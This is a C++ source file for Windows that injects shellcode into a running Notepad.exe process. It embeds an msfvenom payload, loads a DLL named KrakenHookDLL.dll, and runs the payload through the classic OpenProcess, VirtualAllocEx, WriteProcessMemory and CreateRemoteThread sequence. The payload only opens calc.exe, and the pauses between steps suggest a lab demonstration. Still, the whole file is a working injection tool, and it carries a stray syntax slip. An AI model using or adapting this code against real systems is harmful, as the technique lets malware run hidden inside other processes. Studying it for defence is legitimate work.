#include <windows.h>
#include <string>
#include <iostream>
#include <tlhelp32.h>

DWORD GetProcessIdByName(const std::wstring& processName) {
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnapshot == INVALID_HANDLE_VALUE) {
		std::cerr << "Failed to take a snapshot of processes." << std::endl;
		return 0;
	}

	PROCESSENTRY32 pe32;
	pe32.dwSize = sizeof(PROCESSENTRY32);


	if (Process32First(hSnapshot, &pe32)) {
		do {
			
			if (std::wstring(pe32.szExeFile) == processName) {
				DWORD pid = pe32.th32ProcessID;  
				CloseHandle(hSnapshot);
				return pid;  /
			}
		} while (Process32Next(hSnapshot, &pe32));
	}

	CloseHandle(hSnapshot);
	return 0; 
}
int main() {
	const std::wstring targetProcessName = L"Notepad.exe";
	std::wcout << "Searching for process " << targetProcessName << std::endl;
	DWORD pid = GetProcessIdByName(targetProcessName);
	if (pid == 0) {
		std::cout << "process not found...exiting!" << std::endl;
		system("pause");
		return 1;
	}


	HMODULE hDll = LoadLibraryA("KrakenHookDLL.dll");
	if (hDll == NULL) {
		return 1;
	}
	Sleep(5000);

	HANDLE pHandle = NULL;
	PVOID rBuffer = NULL;



	// msfvenom -p windows/x64/exec CMD="calc.exe" -f c
	unsigned char buf[] =
		"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
		"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
		"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
		"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
		"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
		"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
		"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
		"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
		"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
		"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
		"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
		"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
		"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
		"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
		"\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
		"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
		"\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"
		"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
		"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
		"\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";


	pHandle = OpenProcess(
		PROCESS_ALL_ACCESS,
		FALSE,
		DWORD(pid));
	printf("Got handle to pid [%i] Handle is: %p\n", pid, pHandle);

	system("pause");


	rBuffer = VirtualAllocEx(
		pHandle,
		NULL,
		sizeof(buf),
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE);
	printf("Allocted memory for shellcode: %p\n", rBuffer);

	system("pause");

	WriteProcessMemory(
		pHandle,
		rBuffer,
		buf,
		sizeof(buf),
		NULL);	
	printf("Wrote shellcode into process memory of PID: %i\n", pid);

	system("pause");


	HANDLE hThread = CreateRemoteThread(
		pHandle,
		NULL,
		0,
		(LPTHREAD_START_ROUTINE)rBuffer,
		NULL,
		0,
		NULL);
	printf("Remote thread %p created in PID : %i\n", hThread, pid);


	CloseHandle(hThread); 
	CloseHandle(pHandle);

	return 0;
}
